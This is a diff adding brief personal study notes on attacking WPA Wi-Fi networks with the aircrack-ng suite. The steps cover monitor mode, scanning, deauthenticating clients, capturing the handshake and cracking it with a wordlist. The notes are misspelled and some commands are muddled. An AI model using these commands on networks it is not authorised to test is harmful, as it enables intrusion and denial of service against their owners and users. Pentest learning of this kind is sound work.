@@ -1,0 +1,31 @@
+WIRELESS ATTACK PROCESS
+
+REQUIREMENTS 
+*NIC  which change to monitor mode 
+*a laptop 
+*a router 
+
+*Change your network card to monitor mode 
+*Discover the Networks
+*Perfome deauth attack
+*Capture the WPA handshake 
+*Attempt to crack the handshake
+
+
+	CHANGING WIRELESS NIC TO MONITOR 
+type iwconfig 
+the airomon-ng ckeck kill --it kills alll the processes which may inder the process
+    airomon-ng start wlan0mon --NIC goes into monotor mode 
+
+	DISCOVER THE NETWORK 
+airodump-ng wlan0mon -- it will identify all thr available network including the hidden  ones
+
+	PERFOME DEAUTH 
+airodump-ng -c (channel) --bssid (bsssid) -w (outputfile) wlan0mon
+
+	to increase the deauth speed
+aireplay-ng -0 (attack) -a (bssid) -c (station) wlan0mon
+
+
+	ATTEMPT TO CRACK THE HANDSHAKE
+aircrack-ng -w (wordlist) -b (bssid) capturefile
